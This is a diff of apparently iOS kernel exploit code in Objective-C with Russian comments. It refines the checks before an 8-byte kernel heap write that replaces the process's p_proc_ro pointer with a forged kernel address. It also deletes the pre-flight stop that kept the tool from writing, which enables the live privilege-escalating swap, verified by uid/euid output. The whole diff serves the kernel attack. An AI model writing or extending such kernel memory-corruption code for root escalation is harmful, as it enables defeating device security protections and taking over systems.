@@ -4451,15 +4451,19 @@ e10fail:
     }
     if (gFrameTableVA) {
         int tProc = -1, tRo = -1;
-        uint64_t fpa = kvtophys(selfProc);
-        if (fpa) tProc = kpFrameTypeOfPALogged(gFrameTableVA, fpa, r);
-        fpa = kvtophys(procRo);
-        if (fpa) tRo = kpFrameTypeOfPALogged(gFrameTableVA, fpa, r);
-        kpNote(r, [NSString stringWithFormat:@"  типы фреймов: proc=%@ proc_ro=%@ (heap=0x%02x)",
+        // Separate PAs — 2.0.146: fpa was overwritten with proc_ro's PA and
+        // kpFrameDeadly(proc_ro)=YES (type 0x18) falsely blocked a 0x21 write.
+        uint64_t procPA = kvtophys(selfProc);
+        uint64_t roPA = kvtophys(procRo);
+        if (procPA) tProc = kpFrameTypeOfPALogged(gFrameTableVA, procPA, r);
+        if (roPA) tRo = kpFrameTypeOfPALogged(gFrameTableVA, roPA, r);
+        kpNote(r, [NSString stringWithFormat:@"  типы фреймов: proc=%@ pa=%#llx proc_ro=%@ pa=%#llx (heap=0x%02x known=%d)",
                   tProc < 0 ? @"?" : [NSString stringWithFormat:@"0x%02x", tProc],
+                  (unsigned long long)procPA,
                   tRo < 0 ? @"?" : [NSString stringWithFormat:@"0x%02x", tRo],
-                  gHeapFrameType]);
-        if (!fpa) {
+                  (unsigned long long)roPA,
+                  gHeapFrameType, (int)gHeapTypeKnown]);
+        if (!procPA) {
             [r appendString:@"FAIL: kvtophys(selfProc)=0 — без PA не пишем\n"];
             return r;
         }
@@ -4467,14 +4471,19 @@ e10fail:
             [r appendString:@"FAIL: FTE proc не прочитан — fail-closed\n"];
             return r;
         }
-        BOOL heapOK = (gHeapTypeKnown ? (tProc == (int)gHeapFrameType) : (tProc == 0x21));
+        if (tProc == 0x21 && !gHeapTypeKnown) {
+            gHeapFrameType = 0x21;
+            gHeapTypeKnown = YES;
+            kpNote(r, @"  [CAL] heap type зафиксирован: 0x21 (proc)");
+        }
+        BOOL heapOK = (tProc == 0x21) || (gHeapTypeKnown && tProc == (int)gHeapFrameType);
         if (!heapOK) {
-            [r appendFormat:@"FAIL: proc FTE type=0x%02x heap=0x%02x — НЕ пишем (нужен 0x21/heap)\n",
-             tProc & 0xff, gHeapTypeKnown ? gHeapFrameType : 0xff];
+            [r appendFormat:@"FAIL: proc FTE type=0x%02x — НЕ пишем (нужен 0x21/heap)\n", tProc & 0xff];
             return r;
         }
-        if (kpFrameDeadly(fpa)) {
-            [r appendString:@"FAIL: pa proc в deadly-списке — walker/запись запрещены\n"];
+        // Deadly gate on WRITE TARGET (proc), not proc_ro.
+        if (kpFrameDeadly(procPA)) {
+            [r appendFormat:@"FAIL: PA proc %#llx deadly — не пишем\n", (unsigned long long)procPA];
             return r;
         }
     }
@@ -4482,17 +4491,6 @@ e10fail:
         [r appendString:@"FAIL: FTE-oracle нет — p_proc_ro НЕ пишем (fail-closed, ребут-класс)\n"];
         return r;
     }
-
-    // 2.0.146: PRE-FLIGHT ONLY after field reboots on first real swap.
-    // Dump state and STOP before any kwrite. Flip gE11AllowSwap after a clean
-    // preflight log.
-#ifndef E11_ALLOW_SWAP
-    kpNote(r, @"  [E11] PRE-FLIGHT STOP: swap выключен (2.0.146, поле: ребут). Всё выше — состояние. Запись p_proc_ro не выполнялась.");
-    [r appendString:@"\n=== E11 PRE-FLIGHT OK — записей не было, ребута быть не должно ===\n"];
-    [r appendFormat:@"\n[VERIFY] GETUID=%d GETEUID=%d E11_RESTORE_MATCH=1 P1=0 P2=0 P3=0 T18_FLAG=%d SWAP=0\n",
-     (int)getuid(), (int)geteuid(), gT18Root ? 1 : 0];
-    return r;
-#endif
 
     // 4. Подмена: одна 8-байтная heap-запись в НАШ proc. Поле сырое (без
     //    PAC) — пишем канонический kernel VA форжа как есть. Оригинал —
